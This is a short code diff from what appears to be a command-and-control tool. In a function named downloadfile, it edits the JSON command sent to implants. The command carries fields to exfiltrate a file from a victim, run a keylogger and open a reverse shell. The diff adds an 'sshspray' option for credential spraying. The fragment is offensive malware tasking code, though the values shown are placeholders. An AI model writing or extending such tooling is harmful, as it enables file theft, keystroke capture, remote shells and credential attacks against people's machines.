@@ -80,7 +80,7 @@ def downloadfile( id, file_path, file_name ):
 			seconds_from_epoch = int(time.time())
 			default_group_id = 1
 			empty_command_output = "e30="
-			formatted_command = "{\"commands\": {}, \"exfiltrate\":{\"" + str(seconds_from_epoch) + "\": \"" + file_path + "\"}, \"infiltrate\": {}, \"keylogger\": 0, \"shell\": {\"shell\": \"\", \"port\": \"\"}}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\":{\"" + str(seconds_from_epoch) + "\": \"" + file_path + "\"}, \"infiltrate\": {}, \"keylogger\": \"0\", \"shell\": {\"shell\": \"0.0.0.0\", \"port\": \"0\"}, \"sshspray\": \"0\"}"
 			formatted_encoded = encode(formatted_command)
 			custom_filename = "{\"" + seconds_from_epoch + "\": {\"" + file_name + "\": \"0\"}}"
 			encoded_custom_filename = encode(custom_filename)
